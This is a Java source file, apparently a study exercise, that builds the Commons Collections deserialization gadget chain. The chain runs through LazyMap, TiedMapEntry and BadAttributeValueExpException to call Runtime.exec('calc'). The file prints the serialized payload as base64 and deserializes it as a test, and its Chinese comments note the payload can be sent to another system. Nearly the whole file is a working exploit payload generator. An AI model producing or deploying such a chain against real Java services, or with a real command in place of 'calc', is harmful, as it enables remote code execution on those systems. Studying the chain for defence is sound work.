package cn.typesafe.jsv.serializable2;

import cn.typesafe.jsv.util.Serializer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class Exp4 {

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[2]),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        Transformer transformerChain = ChainedTransformer.getInstance(transformers);

        // 在调用 get 方法时传入一个不存在的 key 时会调用 Transformer 的 transform 方法
        Map lazyMap = LazyMap.decorate(new HashMap(), transformerChain);
        // 在调用 toString 方法时会自动调用 getValue 方法并使用 构造方法传入的 key 当作 key
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "守法市民小杜");
        // 创建BadAttributeValueExpException对象，类型是 public 的，无需使用反射创建
        BadAttributeValueExpException obj = new BadAttributeValueExpException(null);
        // 成员 val 没有setVal 方法，只能通过反射修改
        Field valField = obj.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(obj, entry);

        /*-----------------------以下是序列化和反序列化测试----------------------------*/

        // 将用户序列化为字节数组，将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化
        final String data = Base64.getEncoder().encodeToString(Serializer.serialize(obj));
        System.out.println("序列化后：" + data);

        // 将base64编码的数据再解码为字节数组
        final Object o = Serializer.deserialize(Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)));
        System.out.println("反序列化："+o);
    }
}
